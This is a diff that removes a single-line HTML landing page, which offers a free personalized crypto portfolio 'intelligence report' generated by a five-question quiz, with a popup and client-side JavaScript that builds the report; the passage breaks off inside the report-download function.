@@ -1,21 +1,777 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>My The Block Crypto Intelligence Report</title><link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet"><style>  :root{    --bg:#0A0E14;    --surface:#11161F;    --surface-2:#161D29;    --line:#222B38;    --text:#E9EDF3;    --muted:#8B95A5;    --amber:#F2A93B;    --amber-dim:rgba(242,169,59,.14);    --cyan:#4FE0C0;    --cyan-dim:rgba(79,224,192,.14);    --red:#E2604F;    --red-dim:rgba(226,96,79,.14);  }  *{box-sizing:border-box;}  html{scroll-behavior:smooth;}  body{    margin:0;    background:var(--bg);    color:var(--text);    font-family:'Inter',sans-serif;    line-height:1.5;    -webkit-font-smoothing:antialiased;  }  h1,h2,h3{    font-family:'Space Grotesk',sans-serif;    font-weight:600;    margin:0;    color:#fff;    letter-spacing:-0.01em;  }  .mono{    font-family:'IBM Plex Mono',monospace;    text-transform:uppercase;    letter-spacing:0.08em;    font-size:11px;    font-weight:600;  }  p{margin:0;}  a{color:inherit;}  .wrap{max-width:1140px;margin:0 auto;padding:0 28px;}  /* ---------- Buttons ---------- */  .btn{    display:inline-flex; align-items:center; gap:8px;    border:none; cursor:pointer;    font-family:'Inter',sans-serif; font-weight:600; font-size:15px;    padding:15px 26px; border-radius:3px;    transition:transform .15s ease, box-shadow .15s ease, background .15s ease;  }  .btn-primary{ background:var(--amber); color:#19120A; }  .btn-primary:hover{ background:#ffbb55; transform:translateY(-1px); box-shadow:0 8px 22px rgba(242,169,59,.3);}  .btn-outline{ background:transparent; color:var(--text); border:1px solid var(--line); }  .btn-outline:hover{ border-color:#3a4456; background:var(--surface-2); }  .btn-block{width:100%; justify-content:center;}  .btn[disabled]{opacity:.35; cursor:not-allowed; transform:none !important; box-shadow:none !important;}  /* ---------- Popup ---------- */  .overlay{    position:fixed; inset:0;    background:rgba(4,6,10,.72);    backdrop-filter:blur(3px);    display:flex; align-items:center; justify-content:center;    z-index:999; padding:20px;    opacity:0; pointer-events:none;    transition:opacity .35s ease;  }  .overlay.show{opacity:1; pointer-events:auto;}  .popup{    background:var(--surface);    border:1px solid var(--line);    width:100%; max-width:460px;    border-radius:6px; overflow:hidden;    box-shadow:0 40px 90px rgba(0,0,0,.6);    transform:translateY(14px) scale(.98);    transition:transform .35s ease;    position:relative;  }  .overlay.show .popup{transform:translateY(0) scale(1);}  .popup-top{    background:linear-gradient(160deg, #161D29 0%, #0E1219 100%);    padding:26px 28px 22px;    position:relative;    border-bottom:1px solid var(--line);  }  .popup-close{    position:absolute; top:14px; right:14px;    width:28px; height:28px; border-radius:50%;    background:rgba(255,255,255,.06); border:none; color:var(--muted);    cursor:pointer; font-size:16px; line-height:1;    display:flex; align-items:center; justify-content:center;  }  .popup-close:hover{background:rgba(255,255,255,.12); color:#fff;}  .live-dot{    display:inline-flex; align-items:center; gap:6px;    color:var(--cyan); margin-bottom:14px;  }  .live-dot::before{    content:""; width:6px; height:6px; border-radius:50%;    background:var(--cyan); box-shadow:0 0 0 3px var(--cyan-dim);    animation:pulse 1.6s infinite;  }  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.4;} }  .popup-top h3{    font-size:24px; line-height:1.25; margin-bottom:10px; max-width:360px;  }  .popup-top p{ color:var(--muted); font-size:14px; line-height:1.55; }  .popup-body{padding:24px 28px 28px;}  .popup-list{list-style:none; margin:0 0 22px; padding:0; display:flex; flex-direction:column; gap:9px;}  .popup-list li{display:flex; gap:10px; align-items:flex-start; font-size:13.5px; color:var(--text);}  .popup-list li .tag-mini{    font-family:'IBM Plex Mono',monospace; font-size:9.5px; letter-spacing:.05em;    padding:2px 6px; border-radius:3px; flex-shrink:0; margin-top:1px; font-weight:600;  }  .popup-foot{margin-top:14px; text-align:center; font-size:12px; color:var(--muted);}  .popup-dismiss{    display:block; text-align:center; margin-top:14px; font-size:12px;    color:var(--muted); text-decoration:underline; cursor:pointer;    background:none; border:none; width:100%;  }  /* ---------- Nav ---------- */  nav{    position:sticky; top:0; z-index:50;    background:rgba(10,14,20,.85); backdrop-filter:blur(10px);    border-bottom:1px solid var(--line);  }  nav .wrap{display:flex; align-items:center; justify-content:space-between; height:64px;}  .logo{display:flex; align-items:center; gap:9px; font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:17px; color:#fff;}  .logo-mark{    width:24px; height:24px; border-radius:3px;    background:var(--amber); display:flex; align-items:center; justify-content:center;    color:#15100a; font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:13px;  }  nav .btn{padding:10px 18px; font-size:13.5px;}  /* ---------- Hero ---------- */  .hero{padding:78px 0 96px; position:relative; overflow:hidden; border-bottom:1px solid var(--line);}  .hero::before{    content:""; position:absolute; top:-200px; right:-160px; width:540px; height:540px;    background:radial-gradient(circle, rgba(242,169,59,.10), transparent 70%);    pointer-events:none;  }  .hero .wrap{display:grid; grid-template-columns:1.05fr .95fr; gap:54px; align-items:center; position:relative;}  .eyebrow{ color:var(--amber); display:inline-flex; align-items:center; gap:8px; margin-bottom:18px; }  .eyebrow::before{content:"";width:16px;height:1.5px;background:var(--amber);}  .hero h1{font-size:47px; line-height:1.08; margin-bottom:20px; letter-spacing:-0.015em;}  .hero h1 span{color:var(--cyan);}  .hero-sub{font-size:16.5px; color:var(--muted); max-width:480px; margin-bottom:30px; line-height:1.65;}  .hero-ctas{display:flex; align-items:center; gap:18px; flex-wrap:wrap; margin-bottom:18px;}  .hero-micro{font-size:12.5px; color:var(--muted); font-family:'IBM Plex Mono',monospace; letter-spacing:.02em;}  .hero-micro span{color:var(--cyan); font-weight:600;}  /* Signature: terminal report card */  .terminal{    background:var(--surface); border:1px solid var(--line); border-radius:8px;    overflow:hidden; box-shadow:0 40px 90px -24px rgba(0,0,0,.7);  }  .terminal-bar{    display:flex; align-items:center; justify-content:space-between;    padding:13px 18px; border-bottom:1px solid var(--line); background:var(--surface-2);  }  .terminal-bar .dots{display:flex; gap:6px;}  .terminal-bar .dots span{width:8px;height:8px;border-radius:50%; background:#2A3340;}  .terminal-title{font-family:'IBM Plex Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:.04em;}  .terminal-body{padding:20px 20px 18px;}  .t-row{    display:flex; justify-content:space-between; align-items:center;    padding:11px 0; border-bottom:1px solid var(--line); font-size:13px;  }  .t-row:last-of-type{border-bottom:none;}  .t-label{color:var(--muted); font-family:'IBM Plex Mono',monospace; font-size:11.5px; letter-spacing:.02em;}  .t-val{font-family:'IBM Plex Mono',monospace; font-weight:600; font-size:11.5px;}  .flag{    font-family:'IBM Plex Mono',monospace; font-size:10px; letter-spacing:.05em;    padding:4px 9px; border-radius:3px; text-transform:uppercase; font-weight:600;  }  .flag-risk{background:var(--red-dim); color:#F3A294;}  .flag-watch{background:var(--amber-dim); color:var(--amber);}  .flag-good{background:var(--cyan-dim); color:var(--cyan);}  .terminal-lock{    margin-top:14px; padding-top:14px; border-top:1px dashed var(--line);    font-size:11.5px; color:var(--muted); display:flex; align-items:center; gap:8px;    font-family:'IBM Plex Mono',monospace;  }  .lock{width:12px;height:12px;flex-shrink:0;}  /* ---------- Section generic ---------- */  section{padding:84px 0;}  .section-alt{background:var(--surface); border-top:1px solid var(--line); border-bottom:1px solid var(--line);}  .section-head{max-width:640px; margin-bottom:48px;}  .section-head h2{font-size:32px; line-height:1.18; margin-bottom:16px; letter-spacing:-0.01em;}  .section-head p{font-size:15.5px; color:var(--muted); line-height:1.65;}  .center{text-align:center; margin-left:auto; margin-right:auto;}  /* why */  .why-grid{display:grid; grid-template-columns:1fr 1fr; gap:48px; align-items:center;}  .why-copy p{font-size:16px; color:var(--text); line-height:1.75; margin-bottom:18px;}  .why-copy p:last-child{margin-bottom:0; font-weight:600; color:var(--cyan);}  .why-card{ background:var(--surface); border:1px solid var(--line); border-radius:8px; padding:28px; }  .why-card .mono{color:var(--amber); margin-bottom:14px; display:block;}  .why-stat{display:flex; align-items:baseline; gap:10px; margin-bottom:6px;}  .why-stat b{font-family:'Space Grotesk',sans-serif; font-size:34px; color:#fff;}  .why-stat span{font-size:13.5px; color:var(--muted);}  .why-card p{font-size:13.5px; color:var(--muted); margin-top:14px; line-height:1.6;}  /* pillars */  .pillars{display:grid; grid-template-columns:repeat(4,1fr); gap:1px; background:var(--line); border:1px solid var(--line); border-radius:8px; overflow:hidden;}  .pillar{background:var(--bg); padding:30px 24px;}  .pillar .mono{color:var(--amber); display:block; margin-bottom:16px;}  .pillar h3{font-size:17px; margin-bottom:10px; line-height:1.3; color:#fff;}  .pillar p{font-size:13px; color:var(--muted); line-height:1.6;}  /* how it works */  .steps{display:grid; grid-template-columns:repeat(3,1fr); gap:36px;}  .step-num{    font-family:'Space Grotesk',sans-serif; font-size:13px; color:var(--bg);    background:var(--amber); width:30px; height:30px; border-radius:50%;    display:flex; align-items:center; justify-content:center; font-weight:700;    margin-bottom:14px;  }  .step h3{font-size:17px; margin-bottom:8px; color:#fff;}  .step p{font-size:13.5px; color:var(--muted); line-height:1.6;}  /* credibility */  .cred{    background:linear-gradient(135deg,#141B27,#0D1119); border:1px solid var(--line);    border-radius:10px; padding:48px 50px;    display:grid; grid-template-columns:1.2fr .8fr; gap:40px; align-items:center;  }  .cred h2{color:#fff; font-size:27px; margin-bottom:14px; line-height:1.28;}  .cred p{color:var(--muted); font-size:14.5px; line-height:1.7;}  .cred-badges{display:flex; flex-direction:column; gap:14px;}  .badge-row{display:flex; align-items:center; gap:10px; font-size:13px; color:var(--text); font-family:'IBM Plex Mono',monospace;}  .badge-dot{width:6px;height:6px;border-radius:50%; background:var(--amber); flex-shrink:0;}  /* ---------- Quiz ---------- */  #quiz{scroll-margin-top:80px;}  .quiz-card{    max-width:680px; margin:0 auto;    background:var(--surface); border:1px solid var(--line); border-radius:10px;    overflow:hidden; box-shadow:0 24px 60px -28px rgba(0,0,0,.7);  }  .quiz-header{    padding:24px 32px; border-bottom:1px solid var(--line);    display:flex; justify-content:space-between; align-items:center;  }  .quiz-header .mono{color:var(--cyan);}  .progress-track{width:140px; height:4px; background:var(--line); border-radius:3px; overflow:hidden;}  .progress-fill{height:100%; background:var(--amber); width:20%; transition:width .35s ease;}  .quiz-body{padding:32px;}  .q-title{font-size:21px; margin-bottom:6px; color:#fff;}  .q-sub{font-size:13px; color:var(--muted); margin-bottom:22px;}  .options{display:flex; flex-direction:column; gap:9px;}  .option{    border:1.5px solid var(--line); border-radius:6px; padding:14px 17px;    cursor:pointer; font-size:14.5px; font-weight:500; color:var(--text);    transition:border-color .15s ease, background .15s ease;    display:flex; align-items:center; justify-content:space-between;  }  .option:hover{border-color:#3a4456; background:var(--surface-2);}  .option.selected{border-color:var(--cyan); background:rgba(79,224,192,.06); font-weight:600;}  .option .check{    width:17px;height:17px;border-radius:50%; border:1.5px solid var(--line); flex-shrink:0;    display:flex;align-items:center;justify-content:center;  }  .option.selected .check{border-color:var(--cyan); background:var(--cyan);}  .option.selected .check::after{content:"✓"; color:#06120e; font-size:10px; font-weight:700;}  .quiz-nav{display:flex; justify-content:space-between; align-items:center; padding:20px 32px; border-top:1px solid var(--line); background:var(--surface-2);}  .link-btn{background:none; border:none; cursor:pointer; font-size:13.5px; color:var(--muted); font-weight:600; padding:8px;}  .link-btn:hover{color:#fff;}  .link-btn[disabled]{opacity:.3; cursor:not-allowed;}  /* result */  .report-result{display:none;}  .report-result.active{display:block;}  .result-banner{    background:linear-gradient(135deg,#171F2C,#0E1219); border:1px solid var(--line);    border-radius:8px; padding:22px 24px; margin-bottom:24px;  }  .result-banner .mono{color:var(--cyan); display:block; margin-bottom:8px;}  .result-banner h3{color:#fff; font-size:20px; line-height:1.3;}  .result-block{margin-bottom:22px;}  .result-block:last-child{margin-bottom:0;}  .result-block-head{display:flex; align-items:center; gap:9px; margin-bottom:10px;}  .result-block-head h4{font-family:'Space Grotesk',sans-serif; font-size:15px; font-weight:600; color:#fff;}  .result-block p, .result-block li{font-size:14px; color:var(--text); line-height:1.65;}  .result-block ul{margin:0; padding-left:18px;}  .result-block ul li{margin-bottom:6px;}  .download-row{    margin-top:28px; padding-top:24px; border-top:1px solid var(--line);    display:flex; gap:14px; align-items:center; flex-wrap:wrap;  }  .disclaimer{    margin-top:24px; padding:14px 16px; background:var(--surface-2); border:1px solid var(--line);    border-radius:6px; font-size:11.5px; color:var(--muted); line-height:1.6;  }  /* final CTA */  .final-cta{    background:linear-gradient(135deg,#141B27,#0A0E14); border:1px solid var(--line);    border-radius:10px; padding:64px 50px; text-align:center;  }  .final-cta h2{color:#fff; font-size:30px; max-width:620px; margin:0 auto 16px; line-height:1.28;}  .final-cta p{color:var(--muted); max-width:500px; margin:0 auto 28px; font-size:15px; line-height:1.65;}  footer{padding:36px 0; text-align:center; font-size:12px; color:var(--muted); border-top:1px solid var(--line);}  footer .wrap{display:flex; flex-direction:column; gap:8px;}  @media(max-width:860px){    .hero .wrap{grid-template-columns:1fr; gap:44px;}    .hero h1{font-size:34px;}    .why-grid{grid-template-columns:1fr;}    .pillars{grid-template-columns:1fr 1fr;}    .steps{grid-template-columns:1fr;}    .cred{grid-template-columns:1fr;}    .quiz-header{padding:18px 20px;}    .quiz-body{padding:24px 20px;}    .quiz-nav{padding:16px 20px;}    .section-head h2{font-size:25px;}    nav .btn span{display:none;}  }</style></head><body>  <!-- ================= POPUP ================= -->  <div class="overlay" id="overlay">    <div class="popup">      <div class="popup-top">        <button class="popup-close" id="popupClose" aria-label="Close">✕</button>        <span class="live-dot mono">Exclusive · Free Intelligence Report</span>        <h3>Most traders don't see their own blind spots until the market shows them.</h3>        <p>A free, personalized intelligence report built from your portfolio, your risk profile, and The Block's research — not generic market commentary.</p>      </div>      <div class="popup-body">        <ul class="popup-list">          <li><span class="tag-mini flag-risk">Flag</span> Risk flags specific to your positioning and trading style</li>          <li><span class="tag-mini flag-good">Data</span> Portfolio observations benchmarked against current market structure</li>          <li><span class="tag-mini flag-watch">Notes</span> Market structure notes relevant to the assets you hold</li>          <li><span class="tag-mini flag-good">List</span> Watchlist ideas to research next, based on your profile</li>        </ul>        <button class="btn btn-primary btn-block" id="popupCta">Unlock My Intelligence Report →</button>        <p class="popup-foot">Free · 60-second quiz · No account required</p>        <button class="popup-dismiss" id="popupDismiss">No thanks, I'll trade without the edge</button>      </div>    </div>  </div>  <!-- ================= NAV ================= -->  <nav>    <div class="wrap">      <div class="logo"><span class="logo-mark">B</span> The Block</div>      <button class="btn btn-outline" onclick="scrollToQuiz()"><span>Get My</span> Free Report</button>    </div>  </nav>  <!-- ================= HERO ================= -->  <header class="hero">    <div class="wrap">      <div>        <span class="eyebrow mono">A Free Personalized Report</span>        <h1>Your portfolio has a story. <span>Most people never read it.</span></h1>        <p class="hero-sub">Answer a short quiz on your holdings, time horizon, risk tolerance, and trading style. We'll combine your answers with The Block's research and market data to build an intelligence report that's actually about your positioning — not generic crypto news.</p>        <div class="hero-ctas">          <button class="btn btn-primary" onclick="scrollToQuiz()">Get My Free Report</button>        </div>        <p class="hero-micro"><span>FREE</span> &nbsp;//&nbsp; 60-SECOND QUIZ &nbsp;//&nbsp; INSTANT DOWNLOADABLE REPORT</p>      </div>      <div class="terminal">        <div class="terminal-bar">          <div class="dots"><span></span><span></span><span></span></div>          <span class="terminal-title">intelligence_report.preview</span>        </div>        <div class="terminal-body">          <div class="t-row"><span class="t-label">PORTFOLIO CONCENTRATION</span><span class="flag flag-watch">Review</span></div>          <div class="t-row"><span class="t-label">RISK / HORIZON ALIGNMENT</span><span class="flag flag-risk">Flag</span></div>          <div class="t-row"><span class="t-label">MARKET STRUCTURE EXPOSURE</span><span class="flag flag-good">Noted</span></div>          <div class="t-row"><span class="t-label">WATCHLIST</span><span class="t-val">3 ideas</span></div>          <div class="terminal-lock">            <svg class="lock" viewBox="0 0 24 24" fill="none"><rect x="5" y="11" width="14" height="9" rx="1.5" stroke="currentColor" stroke-width="1.6"/><path d="M8 11V7.5a4 4 0 0 1 8 0V11" stroke="currentColor" stroke-width="1.6"/></svg>            FULL REPORT UNLOCKS WITH YOUR ANSWERS          </div>        </div>      </div>    </div>  </header>  <!-- ================= WHY ================= -->  <section>    <div class="wrap why-grid">      <div class="why-copy">        <span class="eyebrow mono">Why This Report Matters</span>        <p>You know what you hold. What's harder to see from the inside is how those positions line up against your own stated risk tolerance and time horizon — and how they sit relative to what's actually happening in market structure right now.</p>        <p>This report takes your answers and runs them against The Block's research and reporting — the same depth institutional desks use to track market structure, on-chain activity, and sector rotation — and turns it into observations specific to your profile.</p>        <p>Not another market recap. Your positioning, decoded.</p>      </div>      <div class="why-card">        <span class="mono">The Block, by the numbers</span>        <div class="why-stat"><b>Daily</b><span>institutional-grade research and market coverage</span></div>        <div class="why-stat"><b>On-chain</b><span>and market structure data behind every report</span></div>        <p>Your report draws on that same research depth — applied to your portfolio, not the average reader's.</p>      </div>    </div>  </section>  <!-- ================= WHAT'S INSIDE ================= -->  <section class="section-alt">    <div class="wrap">      <div class="section-head">        <span class="eyebrow mono">What's Inside</span>        <h2>Your report is built around four things.</h2>        <p>Each section is generated from your quiz answers — not a templated market summary.</p>      </div>      <div class="pillars">        <div class="pillar">          <span class="mono">01 — Position</span>          <h3>Portfolio Observations</h3>          <p>A direct read on how your current holdings and concentration line up with your stated goals and time horizon.</p>        </div>        <div class="pillar">          <span class="mono">02 — Attention</span>          <h3>Risk Flags</h3>          <p>Where your risk tolerance, trading style, and actual positioning may be out of sync — and why that matters.</p>        </div>        <div class="pillar">          <span class="mono">03 — Context</span>          <h3>Market Structure Notes</h3>          <p>How current market structure and sector dynamics intersect with the assets and categories you're exposed to.</p>        </div>        <div class="pillar">          <span class="mono">04 — Action</span>          <h3>Watchlist Ideas</h3>          <p>Categories and themes worth researching further, based on your profile — starting points, not recommendations.</p>        </div>      </div>    </div>  </section>  <!-- ================= HOW IT WORKS ================= -->  <section>    <div class="wrap">      <div class="section-head">        <span class="eyebrow mono">How It Works</span>        <h2>Three steps. About a minute. A real edge.</h2>      </div>      <div class="steps">        <div class="step"><span class="step-num">1</span><h3>Answer a short quiz</h3><p>A few quick questions on your portfolio, time horizon, risk tolerance, trading style, and favorite assets.</p></div>        <div class="step"><span class="step-num">2</span><h3>We build your report</h3><p>Your answers are combined with The Block's research and market data to generate a report specific to your profile.</p></div>        <div class="step"><span class="step-num">3</span><h3>Get instant access</h3><p>See your results immediately and download your full report to keep or revisit.</p></div>      </div>    </div>  </section>  <!-- ================= CREDIBILITY ================= -->  <section class="section-alt">    <div class="wrap">      <div class="cred">        <div>          <h2>Built on the research desks already track.</h2>          <p>The Block covers crypto markets, on-chain data, and market structure with the depth that institutional desks rely on. This report applies that same research lens to your specific portfolio — so what you get isn't just news, it's signal relevant to your positioning.</p>        </div>        <div class="cred-badges">          <div class="badge-row"><span class="badge-dot"></span> Institutional-grade research and data</div>          <div class="badge-row"><span class="badge-dot"></span> No sales calls, ever</div>          <div class="badge-row"><span class="badge-dot"></span> Not financial advice — research only</div>          <div class="badge-row"><span class="badge-dot"></span> Your answers build your report only</div>        </div>      </div>    </div>  </section>  <!-- ================= QUIZ ================= -->  <section id="quiz">    <div class="wrap">      <div class="section-head center">        <span class="eyebrow mono" style="justify-content:center;">Start Here</span>        <h2>Your free 60-second quiz</h2>        <p>Five quick questions. One personalized intelligence report.</p>      </div>      <div class="quiz-card" id="quizCard">        <div class="quiz-header">          <span class="mono" id="quizStepLabel">Question 1 of 5</span>          <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>        </div>        <div class="quiz-body" id="quizBody"></div>        <div class="quiz-nav" id="quizNav">          <button class="link-btn" id="backBtn" onclick="prevStep()" disabled>← Back</button>          <button class="btn btn-primary" id="nextBtn" onclick="nextStep()" disabled>Continue</button>        </div>      </div>      <!-- RESULT -->      <div class="quiz-card report-result" id="reportResult">        <div class="quiz-body">          <div class="result-banner">            <span class="mono">Your Crypto Intelligence Report</span>            <h3 id="resultHeadline">Here's what your answers reveal.</h3>          </div>          <div class="result-block">            <div class="result-block-head"><span class="flag flag-good">Position</span><h4>Portfolio Observation</h4></div>            <p id="resultObservation"></p>          </div>          <div class="result-block">            <div class="result-block-head"><span class="flag flag-risk">Risk Flag</span><h4>Worth Reviewing First</h4></div>            <p id="resultRisk"></p>          </div>          <div class="result-block">            <div class="result-block-head"><span class="flag flag-watch">Context</span><h4>Market Structure Note</h4></div>            <p id="resultStructure"></p>          </div>          <div class="result-block">            <div class="result-block-head"><span class="flag" style="background:rgba(79,224,192,.14); color:var(--cyan);">Ideas</span><h4>Your Watchlist</h4></div>            <ul id="resultWatchlist"></ul>          </div>          <div class="download-row">            <button class="btn btn-primary" onclick="downloadReport()">Download My Full Report</button>            <button class="link-btn" onclick="restartQuiz()">Retake quiz</button>          </div>          <div class="disclaimer">This report is generated from your self-reported answers for educational and research purposes only. It is not financial advice and not a recommendation to buy, sell, or hold any asset. Crypto markets are volatile — always do your own research before making investment decisions.</div>        </div>      </div>    </div>  </section>  <!-- ================= FINAL CTA ================= -->  <section>    <div class="wrap">      <div class="final-cta">        <h2>The only thing standing between you and a sharper read on your portfolio is 60 seconds.</h2>        <p>You can keep trading on instinct alone — or get a research-backed read on where you actually stand, for free, right now.</p>        <button class="btn btn-primary" onclick="scrollToQuiz()">Unlock My Intelligence Report</button>      </div>    </div>  </section>  <footer>    <div class="wrap">      <div>My The Block Crypto Intelligence Report — free, personalized, built on The Block's research and market data.</div>      <div>For informational and educational purposes only. Not financial advice.</div>    </div>  </footer><script>  /* ---------------- Popup ---------------- */  const overlay = document.getElementById('overlay');  function openPopup(){ overlay.classList.add('show'); document.body.style.overflow='hidden'; }  function closePopup(){ overlay.classList.remove('show'); document.body.style.overflow=''; }  setTimeout(openPopup, 700);  document.getElementById('popupClose').addEventListener('click', closePopup);  document.getElementById('popupDismiss').addEventListener('click', closePopup);  overlay.addEventListener('click', (e)=>{ if(e.target===overlay) closePopup(); });  document.getElementById('popupCta').addEventListener('click', ()=>{    closePopup();    scrollToQuiz();  });  function scrollToQuiz(){    document.getElementById('quiz').scrollIntoView({behavior:'smooth', block:'start'});  }  /* ---------------- Quiz ---------------- */  const questions = [    {      key:'portfolio', title:'Which best describes your current crypto holdings?', sub:'Pick the closest match — exact percentages don\u2019t matter here.',      options:[        {v:'btceth', l:'Mostly BTC and ETH'},        {v:'largecap', l:'Diversified across large-cap assets'},        {v:'mixed', l:'A mix of large caps and altcoins'},        {v:'altheavy', l:'Heavy in altcoins or small caps'},        {v:'notyet', l:'Not invested yet — researching'},      ]    },    {      key:'horizon', title:'What\u2019s your time horizon?', sub:'How long do you generally plan to hold a position before reassessing.',      options:[        {v:'long', l:'Long-term (3+ years)'},        {v:'medium', l:'Medium-term (6 months – 3 years)'},        {v:'short', l:'Short-term / active trader'},        {v:'opportunistic', l:'Opportunistic — I move based on setups'},      ]    },    {      key:'risk', title:'How would you describe your risk tolerance?', sub:'Be honest — this shapes your risk flags.',      options:[        {v:'conservative', l:'Conservative — capital preservation first'},        {v:'moderate', l:'Moderate — comfortable with normal volatility'},        {v:'aggressive', l:'Aggressive — high conviction, high volatility'},        {v:'maxrisk', l:'Max risk — I\u2019m fully comfortable with drawdowns'},      ]    },    {      key:'style', title:'Which best describes your trading style?', sub:'How you actually operate, not how you wish you traded.',      options:[        {v:'holdpattern', l:'Buy and hold'},        {v:'dca', l:'Dollar-cost averaging on a schedule'},        {v:'active', l:'Active trading — frequent entries and exits'},        {v:'leverage', l:'Derivatives or leveraged positions'},      ]    },    {      key:'favorite', title:'Which sector or asset are you most focused on right now?', sub:'This shapes your market structure notes and watchlist.',      options:[        {v:'btcmax', l:'Bitcoin / store-of-value'},        {v:'l1', l:'Ethereum and major Layer-1s'},        {v:'defi', l:'DeFi protocols'},        {v:'l2', l:'Layer-2 / scaling infrastructure'},        {v:'spec', l:'Memecoins / speculative assets'},      ]    },  ];  let step = 0;  const answers = {};  function renderStep(){    const q = questions[step];    const body = document.getElementById('quizBody');    document.getElementById('quizStepLabel').textContent = `Question ${step+1} of ${questions.length}`;    document.getElementById('progressFill').style.width = `${((step+1)/questions.length)*100}%`;    let html = `<h3 class="q-title">${q.title}</h3><p class="q-sub">${q.sub}</p><div class="options">`;    q.options.forEach(opt=>{      const selected = answers[q.key] === opt.v ? 'selected' : '';      html += `<div class="option ${selected}" data-val="${opt.v}" onclick="selectOption('${q.key}','${opt.v}')">        <span>${opt.l}</span><span class="check"></span>      </div>`;    });    html += `</div>`;    body.innerHTML = html;    document.getElementById('backBtn').disabled = step===0;    document.getElementById('nextBtn').disabled = !answers[q.key];    document.getElementById('nextBtn').textContent = step === questions.length-1 ? 'Generate My Report' : 'Continue';  }  function selectOption(key,val){    answers[key] = val;    renderStep();  }  function nextStep(){    if(step < questions.length-1){      step++;      renderStep();    } else {      generateReport();    }  }  function prevStep(){    if(step>0){      step--;      renderStep();    }  }  function restartQuiz(){    step = 0;    for(const k in answers) delete answers[k];    document.getElementById('reportResult').classList.remove('active');    document.getElementById('quizCard').style.display = '';    renderStep();    scrollToQuiz();  }  /* ---------------- Report generation logic ---------------- */  function generateReport(){    document.getElementById('quizCard').style.display = 'none';    const result = document.getElementById('reportResult');    result.classList.add('active');    const portfolioLabel = {btceth:'mostly BTC and ETH', largecap:'diversified large-cap assets', mixed:'a mix of large caps and altcoins', altheavy:'a portfolio heavy in altcoins and small caps', notyet:'not yet invested'}[answers.portfolio];    const horizonLabel = {long:'long-term (3+ years)', medium:'medium-term (6 months to 3 years)', short:'short-term, active trading', opportunistic:'opportunistic, setup-driven'}[answers.horizon];    // Portfolio observation    let observation = `With a portfolio described as ${portfolioLabel} and a ${horizonLabel} time horizon, `;    if(answers.portfolio === 'altheavy' && (answers.horizon === 'long')){      observation += `your concentration in altcoins sits somewhat at odds with a long holding period — altcoins typically carry higher volatility and less established liquidity than large caps, which matters more the longer you intend to hold.`;    } else if(answers.portfolio === 'btceth' && answers.horizon === 'short'){      observation += `your BTC/ETH-heavy positioning is generally built for stability rather than short-term moves — your holdings may be more conservative than your trading cadence suggests.`;    } else if(answers.portfolio === 'notyet'){      observation += `you're in a research phase. The highest-value step now is defining your allocation framework before capital is deployed, not picking individual assets first.`;    } else {      observation += `your current mix is broadly consistent with your stated time horizon. The opportunity now is refining position sizing and concentration rather than changing direction.`;    }    document.getElementById('resultObservation').textContent = observation;    // Risk flag    let risk = '';    if(answers.style === 'leverage' && (answers.risk === 'conservative' || answers.risk === 'moderate')){      risk = `You're using derivatives or leverage while describing your risk tolerance as ${answers.risk}. Leverage amplifies both gains and losses regardless of stated risk comfort — this mismatch is worth a closer look before your next position.`;    } else if(answers.style === 'active' && answers.horizon === 'long'){      risk = `You describe a long-term horizon but an active trading style. Frequent entries and exits on long-term capital often increase costs and tax events without necessarily improving outcomes versus a more disciplined approach.`;    } else if(answers.risk === 'maxrisk' && answers.portfolio === 'btceth'){      risk = `Your stated risk tolerance is high, but your current holdings are concentrated in lower-volatility large caps. There may be a gap between the risk you're prepared to take and the risk currently reflected in your portfolio.`;    } else if(answers.favorite === 'spec' && answers.horizon === 'long'){      risk = `Speculative and memecoin exposure typically carries elevated drawdown risk and thinner liquidity than major assets — worth sizing carefully if these positions are meant to be held long-term.`;    } else {      risk = `No major mismatch stood out between your stated risk tolerance, trading style, and time horizon. The opportunity now is monitoring position sizing as market structure shifts, rather than addressing a structural conflict.`;    }    document.getElementById('resultRisk').textContent = risk;    // Market structure note    const structureNotes = {      btcmax:'Bitcoin continues to function as the market\u2019s primary liquidity and sentiment anchor — moves in BTC dominance are typically the first signal worth tracking for broader market structure shifts.',      l1:'Layer-1 ecosystems remain sensitive to network activity, fee dynamics, and competing chain narratives — relative performance against BTC is often a useful gauge of risk appetite in the market.',      defi:'DeFi protocols are closely tied to on-chain liquidity conditions and total value locked trends — structural shifts here often lead broader altcoin sentiment by a cycle.',      l2:'Layer-2 and scaling infrastructure activity tends to track network adoption and fee compression trends — worth watching alongside underlying Layer-1 settlement activity.',      spec:'Speculative and memecoin activity tends to expand during periods of elevated risk appetite and contract sharply when liquidity tightens — it\u2019s typically a late-cycle signal rather than a leading one.',    };    document.getElementById('resultStructure').textContent = structureNotes[answers.favorite];    // Watchlist ideas (category-level, not specific buy recommendations)    const watchlistMap = {      btcmax:['Bitcoin dominance trend relative to total crypto market cap', 'On-chain accumulation activity among long-term holders', 'Macro liquidity conditions and their historical correlation with BTC'],      l1:['Relative performance of major Layer-1s against BTC', 'Network fee and activity trends across leading chains', 'Validator and staking participation rates as a network-health signal'],      defi:['Total value locked trends across leading DeFi protocols', 'Stablecoin supply growth as a liquidity indicator', 'Lending and borrowing rate trends across major platforms'],      l2:['Layer-2 transaction volume relative to Layer-1 settlement', 'Bridge activity and total value bridged trends', 'Fee compression trends as scaling solutions mature'],      spec:['Overall market risk appetite indicators before allocating further', 'Liquidity depth on any speculative position before entry', 'Broader altcoin season indicators as a timing reference'],    };    const watchlist = watchlistMap[answers.favorite];    document.getElementById('resultWatchlist').innerHTML = watchlist.map(w=>`<li>${w}</li>`).join('');    document.getElementById('resultHeadline').textContent = `Here's what your answers reveal.`;    result.scrollIntoView({behavior:'smooth', block:'start'});  }  function downloadReport(){    const lines = [      'MY THE BLOCK CRYPTO INTELLIGENCE REPORT',      '',      'PORTFOLIO OBSERVATION',      document.getElementById('resultObservation').textContent,      '',      'RISK FLAG',      document.getElementById('resultRisk').textContent,      '',      'MARKET STRUCTURE NOTE',      document.getElementById('resultStructure').textContent,      '',      'YOUR WATCHLIST',      